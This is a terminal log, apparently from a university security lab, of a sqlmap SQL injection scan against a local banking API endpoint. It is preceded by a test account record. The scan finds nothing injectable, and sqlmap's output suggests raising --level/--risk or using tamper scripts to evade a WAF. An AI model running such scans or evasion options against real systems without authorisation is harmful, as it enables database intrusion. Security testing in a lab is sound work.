{"id":"0e5b3417-1749-4b05-94a9-4afefa7982d0","socioId":"d1ed7111-1729-41af-b969-25f1d3e1435b","numeroCuenta":"TEST1769098123","saldo":14000,"estado":"ACTIVA","tipoCuenta":"AHORRO","fechaCreacion":"2026-01-22T21:08:43.350Z","fechaActualizacion":"2026-02-05T06:24:30.000Z"} 


┌──(kali㉿kali)-[~/Desktop/SW_LAB3]
└─$ sqlmap -u "http://192.168.100.168:8080/api/socios/identificacion/12345*" --dbs --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.9#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:25:09 /2026-02-04/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
[20:25:10] [INFO] testing connection to the target URL
[20:25:11] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
[20:25:11] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:25:11] [INFO] testing if the target URL content is stable
[20:25:11] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
[20:25:11] [INFO] testing if URI parameter '#1*' is dynamic
[20:25:11] [WARNING] URI parameter '#1*' does not appear to be dynamic
[20:25:11] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[20:25:11] [INFO] testing for SQL injection on URI parameter '#1*'
[20:25:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:25:12] [WARNING] reflective value(s) found and filtering out
[20:25:12] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[20:25:12] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[20:25:12] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[20:25:12] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[20:25:13] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[20:25:13] [INFO] testing 'Generic inline queries'
[20:25:13] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[20:25:13] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[20:25:13] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[20:25:13] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[20:25:13] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[20:25:13] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[20:25:13] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[20:25:14] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[20:25:14] [WARNING] URI parameter '#1*' does not seem to be injectable
[20:25:14] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[20:25:14] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 87 times

[*] ending @ 20:25:14 /2026-02-04/

